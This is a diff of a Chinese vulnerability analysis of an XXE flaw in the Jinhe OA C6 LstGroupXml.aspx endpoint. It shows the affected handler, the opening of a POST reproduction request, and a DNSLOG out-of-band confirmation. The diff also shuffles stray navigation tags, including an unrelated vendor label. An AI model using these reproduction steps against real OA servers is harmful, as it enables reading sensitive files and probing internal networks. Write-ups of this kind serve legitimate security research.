@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `LstGroupXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
 
-孚盟云漏洞
+漏洞分析报告
 
 # 影响版本
 
@@ -21,14 +21,6 @@ asset_dir: embedded-base64
 # 漏洞分析
 
 直接根据 `LstGroupXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **LstGroupXml** 的处理逻辑
-
-深入探索
-
-数据管理
-
-客户关系管理
-
-编程
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -43,8 +35,6 @@ protected void Page_Load(object sender, EventArgs e)
 # 漏洞复现
 
 > 另一个 JHSoft.Web.govsetaip/LstGroupXml.aspx 接口也存在同样的漏洞
->
-> 网络安全
 
 ```
 POST /c6/Jhsoft.Web.groups/LstGroupXml.aspx/ HTTP/1.1
@@ -59,11 +49,11 @@ Host: jhsoft.mrxn.net
 
 深入探索
 
-企业技术
+客户关系管理
 
-Windows 与 .NET
+孚盟云漏洞
 
-计算机安全
+安全研究资源
 
 在DNSLOG平台成功收到请求
 
